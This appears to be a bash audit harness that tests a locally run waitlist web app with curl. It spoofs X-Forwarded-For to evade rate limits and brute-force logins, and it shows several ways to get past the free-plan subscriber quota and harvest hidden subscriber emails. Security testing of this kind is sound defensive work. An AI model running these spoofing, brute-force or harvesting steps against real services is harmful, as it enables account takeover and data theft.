. <racine>/_harness/audit/run-1/tools/lib.sh
STEP=${STEP:-2}; PORT=${PORT:-4102}
B=http://127.0.0.1:$PORT; D=$A/data/s$STEP-limit; DB=$D/waitlist.db
rm -rf $D; mkdir -p $D
J='-H Content-Type:application/json'
CA="-b $D/a.jar -c $D/a.jar"; CB="-b $D/b.jar -c $D/b.jar"
start_server $STEP $PORT $DB TRUST_PROXY=1
curl -s -o /dev/null -X POST $B/api/auth/signup $J $CA -d '{"email":"a@example.com","password":"password-A-123"}'
L1=$(curl -s -X POST $B/api/lists $J $CA -d '{"title":"L1"}' | jget slug)
L2=$(curl -s -X POST $B/api/lists $J $CA -d '{"title":"L2"}' | jget slug)
sub() { curl -s -o /dev/null -w '%{http_code}' -X POST $B/api/w/$1/subscribe $J -H "X-Forwarded-For: 10.$((RANDOM%250)).$((RANDOM%250)).$3" -d "{\"email\":\"$2@example.com\"}"; }
summary() { curl -s $B/api/lists/$1 $CA | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const o=JSON.parse(s);const e=o.subscribers.map(x=>x.email.split("@")[0]);console.log(JSON.stringify({total:o.total,hidden:o.hidden,visible:o.subscribers.length,first:e.slice(-1)[0],last:e[0],timestamps:(o.timestamps||[]).length,plan:o.plan&&{plan:o.plan.plan,used:o.plan.used,hidden:o.plan.hidden}}))})'; }
csvcount() { curl -s $B/api/lists/$1/export.csv $CA | tail -n +2 | grep -c '@'; }
echo "== 130 signups, 60 on L1 then 70 on L2 (one spoofed X-Forwarded-For each: bypasses 20/min IP limit because TRUST_PROXY=1)"
codes=""; for i in $(seq 1 60); do codes="$codes$(sub $L1 u$i $i) "; done; echo "$codes" | tr ' ' '\n' | sort | uniq -c
codes=""; for i in $(seq 61 130); do codes="$codes$(sub $L2 u$i $((i%250)) ) "; done; echo "$codes" | tr ' ' '\n' | sort | uniq -c
echo "== signups are never refused: the limit is on what the owner can SEE"
echo -n "L1: "; summary $L1; echo -n "L2: "; summary $L2
echo "CSV rows L1=$(csvcount $L1) L2=$(csvcount $L2)"
curl -s $B/api/lists $CA | cut -c1-400; echo
echo "== direct API: raw JSON of L2 contains any hidden email (u101..u130)?"
curl -s $B/api/lists/$L2 $CA > $D/l2.json; grep -o 'u1[0-3][0-9]@example.com' $D/l2.json | sort -u | head -3; echo "hidden emails found in JSON: $(grep -o 'u1[0-3][0-9]@example.com' $D/l2.json | sort -u | grep -vc 'u100@')"
echo "keys: $(node -e 'console.log(Object.keys(JSON.parse(require("fs").readFileSync(process.argv[1],"utf8"))).join(","))' $(cygpath -m $D/l2.json))"
echo "== hidden subscriber: delete by guessed id (id 120)"
req DELETE $B/api/lists/$L2/subscribers/120 $CA
echo "== BYPASS 1: export, delete the visible ones, export again (rolling window)"
curl -s $B/api/lists/$L2/export.csv $CA | tail -n +2 | cut -d, -f2 > $D/harvest.txt
IDS=$(node -e 'const o=JSON.parse(require("fs").readFileSync(process.argv[1],"utf8"));console.log(o.subscribers.map(s=>s.id).join(" "))' $(cygpath -m $D/l2.json))
n=0; for id in $IDS; do c=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE $B/api/lists/$L2/subscribers/$id $CA); [ "$c" = 200 ] && n=$((n+1)); done; echo "deleted $n visible subscribers of L2"
echo -n "L2 after delete: "; summary $L2
curl -s $B/api/lists/$L2/export.csv $CA | tail -n +2 | cut -d, -f2 >> $D/harvest.txt
echo "distinct L2 emails harvested on the free plan: $(sort -u $D/harvest.txt | grep -c '@') of 70 (u61..u130)"
echo "u130 harvested? $(grep -c '^u130@' $D/harvest.txt)"
echo "== BYPASS 2: delete a whole list frees quota (new signups to L2 after dropping L1)"
for i in $(seq 131 190); do sub $L2 u$i $((i%250)) >/dev/null; done
echo -n "L2 before dropping L1: "; summary $L2
req DELETE $B/api/lists/$L1 $CA
echo -n "L2 after dropping L1:  "; summary $L2
echo "== BYPASS 3: second free account = another 100"
curl -s -o /dev/null -X POST $B/api/auth/signup $J $CB -H 'X-Forwarded-For: 10.1.1.1' -d '{"email":"b@example.com","password":"password-B-123"}'
curl -s $B/api/billing $CB; echo
echo "== concurrent signups (40 in parallel) on L2"
for i in $(seq 1 40); do ( sub $L2 par$i $i >/dev/null ) & done; wait $(jobs -p | grep -v "^$LAST_PID$") 2>/dev/null
echo -n "L2: "; summary $L2
echo "== same IP without spoofing: rate limit holds at 20/min"
for i in $(seq 1 23); do curl -s -o /dev/null -w '%{http_code} ' -X POST $B/api/w/$L2/subscribe $J -d "{\"email\":\"same$i@example.com\"}"; done; echo
echo "== login brute force with rotating X-Forwarded-For (TRUST_PROXY=1): 15 wrong guesses"
for i in $(seq 1 15); do curl -s -o /dev/null -w '%{http_code} ' -X POST $B/api/auth/login $J -H "X-Forwarded-For: 172.16.0.$i" -d '{"email":"a@example.com","password":"guess-'$i'"}'; done; echo
echo "== cookie Secure flag with X-Forwarded-Proto: https (TRUST_PROXY=1)"
curl -s -D - -o /dev/null -X POST $B/api/auth/login $J -H 'X-Forwarded-Proto: https' -H 'X-Forwarded-For: 172.20.0.1' -d '{"email":"a@example.com","password":"password-A-123"}' | grep -i set-cookie
stop_all
